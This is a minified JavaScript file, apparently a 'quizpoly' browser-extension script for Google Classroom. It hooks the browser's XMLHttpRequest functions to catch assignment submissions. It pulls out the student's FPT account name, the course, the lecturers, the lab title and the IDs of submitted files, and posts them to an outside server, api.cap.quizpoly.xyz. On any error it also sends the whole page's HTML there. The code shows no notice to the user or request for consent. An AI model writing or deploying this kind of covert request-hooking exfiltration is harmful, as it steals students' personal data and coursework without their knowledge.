const apiUrl="https://api.cap.quizpoly.xyz";let open=window.XMLHttpRequest.prototype.open,send=window.XMLHttpRequest.prototype.send;function openReplacement(e,t,n,o,a){return this._url=t,open.apply(this,arguments)}function sendReplacement(e){return this.onreadystatechange&&(this._onreadystatechange=this.onreadystatechange),this.onreadystatechange=onReadyStateChangeReplacement,send.apply(this,arguments)}function onReadyStateChangeReplacement(){if(4==this.readyState&&this.responseURL.includes("writesubmission")&&onUpload(this.response),this._onreadystatechange)return this._onreadystatechange.apply(this,arguments)}function onUpload(e){let t=JSON.parse(e.replace(")]}'","").trim())[0][0][1][0][4];t=t.map(e=>({name:e[0],id:e[2]})),console.debug(t);try{let e=document.body.querySelector('[aria-label^="Tài khoản Google"]');if(e=e||document.body.querySelector('[aria-label^="Google Account"]'),!e)return sendHtml("Can't find studentEl");var n=e.getAttribute("aria-label").split("(").splice(-1)[0].replace(")","").replace("@fpt.edu.vn",""),o=document.querySelector("div[role=main]>div>div>div:nth-of-type(1)>h1").innerText.trim(),a={subjectName:document.querySelector("nav[role=navigation]>div>div>div>h1>a").innerText.trim().replace("\n"," - "),lecturers:document.querySelector("div[role=main]>div>div>div:nth-of-type(2)>div").innerText.trim(),lab:o,student:n,files:t};console.debug(a),fetch(apiUrl+"/quizpoly/labcr",{method:"POST",headers:{"Content-Type":"application/json"},referrerPolicy:"origin",body:JSON.stringify(a)}).then(e=>e.json()).then(e=>console.debug(e))}catch(e){console.debug(e),sendHtml(`Send files classroom error: ${e.message}`)}}async function sendHtml(e){try{fetch(apiUrl+"/quizpoly/html",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({note:`${e}`,html:document.body.innerHTML.replaceAll("\n","").replaceAll("\t","")})})}catch(e){console.debug(e)}}window.XMLHttpRequest.prototype.open=openReplacement,window.XMLHttpRequest.prototype.send=sendReplacement;